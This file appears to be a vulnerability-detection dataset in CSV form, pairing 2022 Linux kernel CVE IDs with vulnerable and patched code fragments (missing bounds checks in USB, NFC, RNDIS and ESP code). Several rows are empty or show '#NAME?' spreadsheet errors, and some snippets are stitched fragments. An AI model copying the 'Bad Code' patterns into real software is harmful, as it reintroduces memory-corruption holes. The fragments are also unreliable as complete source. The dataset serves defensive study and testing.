Year,Type of vulnerability,CVE ID number,Bad Code,Good Code
2022,,CVE-2022-27950,"
 return 0;
err_free:

 kfree(priv);
 return ret;
}
","
 return 0;
err_free:
 usb_put_dev(udev);
 kfree(priv);
 return ret;
}
"
2022,Overflow ,CVE-2022-27666,"
#include <linux/skbuff.h>



struct ip_esp_hdr;

static inline struct ip_esp_hdr *ip_esp_hdr(const struct sk_buff *skb)
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;


 /* this is non-NULL only with TCP/UDP Encapsulation */
 if (x->encap) {
 return err;
	}





 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;


 if (x->encap) {
 int err = esp6_output_encap(x, skb, esp);
 return err;
	}





 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
","
#include <linux/skbuff.h>

#define ESP_SKB_FRAG_MAXSIZE (PAGE_SIZE << SKB_FRAG_PAGE_ORDER)

struct ip_esp_hdr;

static inline struct ip_esp_hdr *ip_esp_hdr(const struct sk_buff *skb)
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;
 unsigned int allocsz;

 /* this is non-NULL only with TCP/UDP Encapsulation */
 if (x->encap) {
 return err;
	}

	allocsz = ALIGN(skb->data_len + tailen, L1_CACHE_BYTES);
 if (allocsz > ESP_SKB_FRAG_MAXSIZE)
 goto cow;

 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
 struct page *page;
 struct sk_buff *trailer;
 int tailen = esp->tailen;
 unsigned int allocsz;

 if (x->encap) {
 int err = esp6_output_encap(x, skb, esp);
 return err;
	}

	allocsz = ALIGN(skb->data_len + tailen, L1_CACHE_BYTES);
 if (allocsz > ESP_SKB_FRAG_MAXSIZE)
 goto cow;

 if (!skb_cloned(skb)) {
 if (tailen <= skb_tailroom(skb)) {
			nfrags = 1;
"
2022,,CVE-2022-27223," break;
 case USB_RECIP_ENDPOINT:
		epnum = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;


		target_ep = &udc->ep[epnum];
		epcfgreg = udc->read_fn(udc->addr + target_ep->offset);
		halt = epcfgreg & XUSB_EP_CFG_STALL_MASK;
 case USB_RECIP_ENDPOINT:
 if (!udc->setup.wValue) {
			endpoint = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;




			target_ep = &udc->ep[endpoint];
			outinbit = udc->setup.wIndex & USB_ENDPOINT_DIR_MASK;
			outinbit = outinbit >> 7;
"," break;
 case USB_RECIP_ENDPOINT:
		epnum = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;
 if (epnum >= XUSB_MAX_ENDPOINTS)
 goto stall;
		target_ep = &udc->ep[epnum];
		epcfgreg = udc->read_fn(udc->addr + target_ep->offset);
		halt = epcfgreg & XUSB_EP_CFG_STALL_MASK;
 case USB_RECIP_ENDPOINT:
 if (!udc->setup.wValue) {
			endpoint = udc->setup.wIndex & USB_ENDPOINT_NUMBER_MASK;
 if (endpoint >= XUSB_MAX_ENDPOINTS) {
 xudc_ep0_stall(udc);
 return;
			}
			target_ep = &udc->ep[endpoint];
			outinbit = udc->setup.wIndex & USB_ENDPOINT_DIR_MASK;
			outinbit = outinbit >> 7;
"
2022,#NAME?,CVE-2022-26966,,
2022,,CVE-2022-26878,,
2022,Overflow ,CVE-2022-26490," return -ENOMEM;

		transaction->aid_len = skb->data[1];





 memcpy(transaction->aid, &skb->data[2],
		       transaction->aid_len);

 return -EPROTO;

		transaction->params_len = skb->data[transaction->aid_len + 3];





 memcpy(transaction->params, skb->data +
		       transaction->aid_len + 4, transaction->params_len);

"," return -ENOMEM;

		transaction->aid_len = skb->data[1];

 /* Checking if the length of the AID is valid */
 if (transaction->aid_len > sizeof(transaction->aid))
 return -EINVAL;

 memcpy(transaction->aid, &skb->data[2],
		       transaction->aid_len);

 return -EPROTO;

		transaction->params_len = skb->data[transaction->aid_len + 3];

 /* Total size is allocated (skb->len - 2) minus fixed array members */
 if (transaction->params_len > ((skb->len - 2) - sizeof(struct nfc_evt_transaction)))
 return -EINVAL;

 memcpy(transaction->params, skb->data +
		       transaction->aid_len + 4, transaction->params_len);

"
2022,#NAME?,CVE-2022-25636,,
2022,#NAME?,CVE-2022-25375,"	rndis_set_cmplt_type *resp;
 rndis_resp_t *r;







	r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
 if (!r)
 return -ENOMEM;
	resp = (rndis_set_cmplt_type *)r->buf;

	BufLength = le32_to_cpu(buf->InformationBufferLength);
	BufOffset = le32_to_cpu(buf->InformationBufferOffset);

#ifdef	VERBOSE_DEBUG
 pr_debug(""%s: Length: %d\n"", __func__, BufLength);
 pr_debug(""%s: Offset: %d\n"", __func__, BufOffset);
","	rndis_set_cmplt_type *resp;
 rndis_resp_t *r;

	BufLength = le32_to_cpu(buf->InformationBufferLength);
	BufOffset = le32_to_cpu(buf->InformationBufferOffset);
 if ((BufLength > RNDIS_MAX_TOTAL_SIZE) ||
	    (BufOffset + 8 >= RNDIS_MAX_TOTAL_SIZE))
 return -EINVAL;

	r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
 if (!r)
 return -ENOMEM;
	resp = (rndis_set_cmplt_type *)r->buf;




#ifdef	VERBOSE_DEBUG
 pr_debug(""%s: Length: %d\n"", __func__, BufLength);
 pr_debug(""%s: Offset: %d\n"", __func__, BufOffset);
"
2022,,CVE-2022-25265,,
2022,Mem. Corr. ,CVE-2022-25258," if (w_index != 0x5 || (w_value >> 8))
 break;
				interface = w_value & 0xFF;



				buf[6] = w_index;
				count = count_ext_prop(os_desc_cfg,
					interface);
"," if (w_index != 0x5 || (w_value >> 8))
 break;
				interface = w_value & 0xFF;
 if (interface >= MAX_CONFIG_INTERFACES ||
				    !os_desc_cfg->interface[interface])
 break;
				buf[6] = w_index;
				count = count_ext_prop(os_desc_cfg,
					interface);
"
